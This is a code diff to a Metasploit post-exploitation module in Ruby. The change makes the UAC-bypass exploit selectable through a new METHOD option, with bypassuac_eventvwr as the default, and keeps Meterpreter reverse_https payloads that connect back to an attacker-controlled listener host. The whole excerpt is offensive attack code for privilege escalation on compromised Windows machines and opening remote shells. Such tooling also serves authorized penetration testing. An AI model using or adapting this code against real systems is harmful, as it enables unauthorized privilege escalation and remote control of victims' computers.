@@ -24,6 +24,7 @@ class MetasploitModule < Msf::Post
     register_options(
       [
         OptString.new('LHOST',   [ true, 'The local listener hostname']),
+        OptString.new('METHOD',   [ true, 'The bypass UAC exploit to use', 'exploit/windows/local/bypassuac_eventvwr']),
         OptString.new('64_PAYLOAD',   [ true, 'Payload to use on x64 machines', 'windows/x64/meterpreter/reverse_https']),
         OptPort.new('64_LPORT',   [ true, 'The local listener port for x64 payload']),
         OptString.new('86_PAYLOAD',   [ true, 'Payload to use on x86 machines', 'windows/meterpreter/reverse_https']),
@@ -46,7 +47,7 @@ class MetasploitModule < Msf::Post
     sysarch = sysinfo['Architecture']
     lhost = datastore['LHOST']
 
-    exploit_mod = "exploit/windows/local/bypassuac_injection"
+    exploit_mod = datastore['METHOD']
  
     if exploit_mod =~ /^exploit\//
       exploit_mod.gsub!(/^exploit\//,"")
@@ -71,7 +72,7 @@ class MetasploitModule < Msf::Post
       arch = "x86"
     end
 
-    print_status("Running exploit/windows/local/bypassuac_injection against session: #{datastore['SESSION']}")
+    print_status("Running #{exploit_mod} against session: #{datastore['SESSION']}")
     print_status("Machine is #{arch}, using payload #{payload} to #{lhost}:#{lport}")
 
     bypassuac.datastore['LHOST'] = lhost
